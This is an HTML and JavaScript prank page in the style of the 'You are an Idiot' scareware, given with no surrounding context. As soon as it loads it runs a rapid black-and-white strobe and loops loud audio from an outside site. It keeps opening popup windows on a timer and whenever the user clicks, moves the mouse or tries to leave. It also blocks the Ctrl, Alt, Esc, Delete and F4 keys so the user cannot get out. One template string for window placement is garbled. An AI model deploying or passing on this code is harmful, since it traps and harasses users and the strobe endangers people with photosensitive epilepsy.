<!DOCTYPE html>
<html>
<head>
<title>You are an Idiot!</title>
<meta charset="utf-8">
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  html, body {
    width: 100%;
    height: 100%;
    overflow: hidden;
    background: #000;
    color: #fff;
  }

  #screamer {
    width: 100%;
    height: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-align: center;
    animation: flash 0.25s infinite steps(2);
  }

  @keyframes flash {
    0%   { background: #000; color: #fff; }
    50%  { background: #fff; color: #000; }
  }

  h1 {
    font-family: "Times New Roman", Times, serif;
    font-size: 7vw;
    font-weight: normal;
    margin-bottom: 40px;
    letter-spacing: 2px;
  }

  .faces {
    display: flex;
    gap: 40px;
  }

  .face {
    width: 80px;
    height: 80px;
    border: 6px solid currentColor;
    border-radius: 50%;
    position: relative;
  }

  /* Глаза */
  .face::before,
  .face::after {
    content: "";
    position: absolute;
    width: 12px;
    height: 12px;
    background: currentColor;
    border-radius: 50%;
    top: 22px;
  }

  .face::before {
    left: 18px;
  }

  .face::after {
    right: 18px;
  }

  /* Улыбка */
  .face span {
    position: absolute;
    bottom: 18px;
    left: 50%;
    transform: translateX(-50%);
    width: 36px;
    height: 18px;
    border-bottom: 6px solid currentColor;
    border-radius: 0 0 40px 40px;
  }
</style>
</head>
<body>

<div id="screamer">
  <h1>YOU ARE AN IDIOT</h1>
  <div class="faces">
    <div class="face"><span></span></div>
    <div class="face"><span></span></div>
    <div class="face"><span></span></div>
  </div>
</div>

<audio id="audio" loop>
  <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
</audio>

<script>
  const audio = document.getElementById("audio");

  function playSound() {
    audio.volume = 1;
    audio.play().catch(() => {});
  }

  function spawn(count = 4) {
    for (let i = 0; i < count; i++) {
      const left = Math.floor(Math.random() * (screen.availWidth - 300));
      const top  = Math.floor(Math.random() * (screen.availHeight - 220));

      const w = window.open(
        location.href,
        "_blank",
        `width=280,height=200,left=\( {left},top= \){top},menubar=no,toolbar=no,location=no,status=no,resizable=no`
      );
      if (w) {
        try { w.focus(); } catch(e) {}
      }
    }
  }

  function start() {
    playSound();
    spawn(5);

    setInterval(() => spawn(3), 800);

    window.onbeforeunload = () => {
      spawn(6);
      return "You are an idiot!";
    };

    document.body.onclick = () => {
      playSound();
      spawn(4);
    };

    document.body.onmousemove = () => {
      playSound();
      if (Math.random() > 0.92) spawn(2);
    };

    document.onkeydown = (e) => {
      if ([17, 18, 27, 46, 115].includes(e.keyCode)) {
        e.preventDefault();
        alert("YOU ARE AN IDIOT");
        spawn(4);
      }
    };
  }

  window.onload = start;
  setTimeout(playSound, 300);
  setTimeout(playSound, 800);
</script>
</body>
</html>
